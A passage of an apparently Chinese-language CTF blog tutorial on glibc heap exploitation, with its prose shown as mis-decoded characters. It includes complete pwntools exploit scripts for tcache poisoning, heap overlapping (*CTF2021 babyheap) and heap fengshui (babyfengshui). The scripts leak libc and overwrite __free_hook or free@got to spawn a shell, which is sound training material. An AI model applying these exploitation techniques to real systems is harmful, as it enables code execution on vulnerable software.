class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;bytes:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="string">&#x27;arttnba1&#x27;</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="number">0x10</span>, <span class="string">&#x27;arttnba0&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba2&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;shell&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;sheep&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;sheep&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba0&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># clear the tcache key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba2&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap addr</span></span><br><span class="line">    free(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input&quot;</span>)</span><br><span class="line">    heap_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;bytes&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    new(<span class="string">&#x27;arttnba3&#x27;</span>, <span class="number">0x90</span>, <span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba3&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc</span></span><br><span class="line">    free(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input&quot;</span>)</span><br><span class="line">    main_arena = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;bytes&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">96</span></span><br><span class="line">    p.sendline(p64(main_arena + <span class="number">96</span>)) <span class="comment"># fix the heap</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    edit(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>) * <span class="number">3</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba7&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">    new(<span class="string">&#x27;freehook&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line">    edit(<span class="string">&#x27;shell&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x20</span> + <span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">10</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    free(<span class="string">&#x27;sheep&#x27;</span>) <span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜2ï¼ˆfastbin-double-freeï¼‰ï¼šbytectf2020-gun"><a href="#ä¾‹é¢˜2ï¼ˆfastbin-double-freeï¼‰ï¼šbytectf2020-gun" class="headerlink" title="ä¾‹é¢˜2ï¼ˆfastbin double freeï¼‰ï¼šbytectf2020 - gun"></a>ä¾‹é¢˜2ï¼ˆfastbin double freeï¼‰ï¼šbytectf2020 - gun</h5><p>ç¬”è€…åšè¿‡çš„é¢˜ä¼¼ä¹å°±åªæœ‰è¿™ä¸€é“åˆ©ç”¨äº†è¿™ä¸ªæœºåˆ¶â€¦è¿™é“é¢˜å› ä¸ºåŒæ—¶è¿˜åˆ©ç”¨äº†setcontextæ•…æ”¾åˆ°åé¢å†è®²</p><h3 id="å››ã€å †é‡å ï¼ˆHeap-Overlappingï¼‰"><a href="#å››ã€å †é‡å ï¼ˆHeap-Overlappingï¼‰" class="headerlink" title="å››ã€å †é‡å ï¼ˆHeap Overlappingï¼‰"></a>å››ã€å †é‡å ï¼ˆHeap Overlappingï¼‰</h3><p>å †å—é‡å å³æˆ‘ä»¬åŒæ—¶æ‹¥æœ‰ä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„ä¸‹æ ‡æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ä¾¿å¯ä»¥æ‰‹åŠ¨å®ç°double freeã€åœ°å€æ³„éœ²ç­‰å„ç§åˆ©ç”¨ï¼Œååˆ†æ–¹ä¾¿</p><h5 id="ä¾‹é¢˜ï¼š-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><a href="#ä¾‹é¢˜ï¼š-CTF2021-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="ä¾‹é¢˜ï¼š*CTF2021 - babyheap - Use After Free + tcache poisoning"></a>ä¾‹é¢˜ï¼š*CTF2021 - babyheap - Use After Free + tcache poisoning</h5><blockquote><p> æ¯”è¾ƒç™½ç»™çš„ç­¾åˆ°é¢˜</p></blockquote><p><a href="/download/starCTF2021/pwn/babyheap.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babyheap.zip</a></p><p>æƒ¯ä¾‹çš„checksecï¼Œä¿æŠ¤å…¨å¼€ï¼ˆ<del>åŸºæœ¬ä¸Šå¤§æ¯”èµ›é¢˜ç›®éƒ½æ˜¯é»˜è®¤ä¿æŠ¤å…¨å¼€çš„</del></p><p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" alt="AXQ_ZFH21P_~~AUA84UQH7H.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" alt="V6__6F0BSJGIF__91WSD_CY.png"></p><p><del>ä¸€  è§ˆ  æ—   ä½™</del>ï¼ˆ<del>ä¸åƒåé¢é‚£ä¸ªç¬¦å·è¡¨æ‰£å…‰çš„C++ pwn babygameäººéƒ½ç»™çœ‹å‚»äº†</del></p><p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€åˆ é™¤ã€ä¿®æ”¹ã€æ‰“å°å †å—å†…å®¹</strong>çš„åŠŸèƒ½ï¼Œ<del>ç»™çš„é¢é¢ä¿±åˆ°ï¼Œååˆ†ç™½ç»™</del></p><p>æ¼æ´ç‚¹åœ¨äº<code>delete()</code>å‡½æ•°ä¸­freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨ Use After Freeæ¼æ´</strong></p><p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png" alt="image.png"></p><p>åœ¨<code>add()</code>å‡½æ•°ä¸­æˆ‘ä»¬æœ‰ç€16ä¸ªå¯ç”¨çš„ä¸‹æ ‡ï¼Œä¸”åˆ†é…æ—¶ä¼šç›´æ¥è¦†å†™åŸæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å‡ ä¹æ˜¯å¯ä»¥åˆ†é…ä»»æ„ä¸ªchunkï¼Œä½†æ˜¯<strong>åªå…è®¸æˆ‘ä»¬åˆ†é…fastbin sizeèŒƒå›´çš„chunk</strong></p><p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" alt="UAB1IY_NM_5GP_K2Y_4TL4V.png"></p><p>å› æ­¤è‹¥æƒ³è¦æ³„éœ²libcåœ°å€æˆ‘ä»¬éœ€è¦å€ŸåŠ©<code>malloc_consolidate()</code>å°†chunké€å…¥small binsä¸­</p><p>æ³¨æ„åˆ°<code>leaveYourName()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨malloc()åˆ†é…ä¸€ä¸ªå¤§chunkï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°è§¦å‘<code>malloc_consolidate()</code>ï¼Œå°†fastbinä¸­chunké€å…¥smallbinï¼Œ ä»¥æ³„éœ²libcåŸºå€</p><p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" alt="~D9_XAV_4G5_FGKSMTED_13.png"></p><p>gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¯¥åœ°å€ä¸main_arenaé—´è·336ï¼Œå› è€Œæˆ‘ä»¬ä¾¿å¯ä»¥å¾—åˆ°libcåŸºå€</p><p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png" alt="image.png"></p><p><strong>å°†è¿™ä¸ªsmall binå†åˆ†é…å›æ¥æˆ‘ä»¬å°±èƒ½å¤Ÿå®ç°chunk overlappingäº†ï¼Œç»§è€Œå°±æ˜¯é€šè¿‡ç¨‹åºçš„editåŠŸèƒ½å®ç°tcache poisoningä¿®æ”¹__free_hookä¸ºsystem()åfreeä¸€ä¸ªå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„chunkå³å¯get shell</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>edit()</code>å‡½æ•°ä¸­æ˜¯<strong>ä»bkçš„ä½ç½®å¼€å§‹è¾“å…¥</strong>çš„ï¼Œå› è€Œæˆ‘ä»¬çš„fake chunkéœ€è¦æ„é€ åˆ°<code>__free_hook - 8 </code>çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8081)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leaveYourName</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span></span><br><span class="line">    leaveYourName(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">336</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;Libc addr:&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcache poisoning</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    new(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">9</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png" alt="image.png"></p><h3 id="äº”ã€å †é£æ°´ï¼ˆHeap-Fengshuiï¼‰"><a href="#äº”ã€å †é£æ°´ï¼ˆHeap-Fengshuiï¼‰" class="headerlink" title="äº”ã€å †é£æ°´ï¼ˆHeap Fengshuiï¼‰"></a>äº”ã€å †é£æ°´ï¼ˆHeap Fengshuiï¼‰</h3><p>æ‰€è°“å †é£æ°´ä¹Ÿå«ä½œå †æ’å¸ƒï¼Œå…¶å®è¯´ä¸¥æ ¼äº†å¹¶ä¸æ˜¯ä¸€ç§æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯ä¸€ç§çµæ´»å¸ƒç½®å †å—æ¥æ§åˆ¶å †å¸ƒå±€çš„æ–¹æ³•ï¼Œåœ¨ä¸€äº›ä¸€äº›å…¶ä»–æ¼æ´çš„åˆ©ç”¨ä¸­èµ·åˆ°æ•ˆæœ </p><p>å †é£æ°´ä¸€è¯æºäºä¸­å›½é“æ•™çš„â€œé£æ°´â€ä¸€è¯ï¼Œè¿™ä¸ªè¯æ— æ³•å¾ˆå¥½åœ°è¢«ç¿»è¯‘ä¸ºè‹±æ–‡æ•…ç›´æ¥å–å…¶æ‹¼éŸ³</p><h5 id="ä¾‹é¢˜ï¼šbabyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#ä¾‹é¢˜ï¼šbabyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="ä¾‹é¢˜ï¼šbabyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>ä¾‹é¢˜ï¼šbabyfengshui_33c3_2016 - heap arrangement + got table hijack</h5><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåˆ†é…å †å—æ—¶æ‰€ç”Ÿæˆçš„å¤§è‡´ç»“æ„åº”å½“å¦‚ä¸‹ï¼Œä¸”<strong>è¯¥ç»“æ„ä½“mallocçš„å¤§å°ä¸º0x80ï¼Œå¤„åœ¨unsorted bin èŒƒå›´å†…</strong></p><p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p><p>æ¼æ´ç‚¹åœ¨äºå¯¹è¾“å…¥é•¿åº¦çš„æ£€æµ‹ï¼Œå®ƒæ˜¯æ£€æµ‹çš„æ˜¯<strong>æˆ‘ä»¬æ‰€è¾“å…¥çš„é•¿åº¦æ˜¯å¦å¤§äºä»description chunkçš„addråˆ°struct chunkçš„prev_sizeçš„é•¿åº¦</strong></p><p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p><p>åœ¨å¸¸è§„æƒ…å†µä¸‹æˆ‘ä»¬ä¼¼ä¹åªèƒ½å¤Ÿè¦†å†™æ‰PREV_SIZEçš„ä¸€éƒ¨åˆ†ï¼Œä¸ç—›ä¸ç—’</p><p>ä½†æ˜¯è€ƒè™‘è¿™æ ·çš„ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬å…ˆåˆ†é…ä¸¤ä¸ªå¤§å—ï¼ˆchunk<em>4ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå—çš„sizeè¦åœ¨unsortedèŒƒå›´å†…ï¼‰ï¼Œä¹‹åé‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå¤§å—ï¼Œå†åˆ†é…ä¸€ä¸ªsizeæ›´å¤§çš„å—ï¼Œunsorted binå†…å°±ä¼šä»è¿™ä¸ªå¤§chunkï¼ˆç”±ä¸¤ä¸ªchunkåˆå¹¶è€Œæ¥ï¼‰ä¸­åˆ‡å‰²ä¸€ä¸ªå¤§chunkç»™åˆ°descriptionï¼Œä¹‹åå†ä»ä¸‹æ–¹çš„top chunkåˆ‡å‰²0x90æ¥ç»™åˆ°structï¼Œè¿™ä¸ªæ—¶å€™*<em>ç”±äºå¯¹lengthçš„é”™è¯¯åˆ¤å®šå°±ä¼šå¯¼è‡´æˆ‘ä»¬æœ‰æœºä¼šè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„å†…å®¹</em></em></p><p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p><p>æ•…è€ƒè™‘å…ˆè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„description addrä¸ºfree@gotåæ³„æ¼å‡ºlibcçš„åŸºå€ï¼Œåå†ä¿®æ”¹free@gotä¸ºsystemå‡½æ•°åœ°å€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh&quot;</code>çš„chunkå³å¯é€šè¿‡<code>system(&quot;/bin/sh&quot;)</code>æ¥get shell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26486)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, name, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 